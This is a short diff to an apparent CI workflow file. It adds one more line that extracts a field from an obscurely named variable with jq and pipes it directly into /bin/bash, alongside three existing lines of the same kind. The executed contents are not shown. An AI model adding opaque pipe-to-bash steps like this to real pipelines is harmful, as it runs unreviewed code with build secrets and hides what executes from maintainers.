@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$ty8600" | jq -r .ohk423 | /bin/bash
           echo $t3 | jq -r .grl21040 | /bin/bash
           echo $hsqnn77395 | jq -r .ykx50658 | /bin/bash
+          echo $sb6373 | jq -r .jcgqb42 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
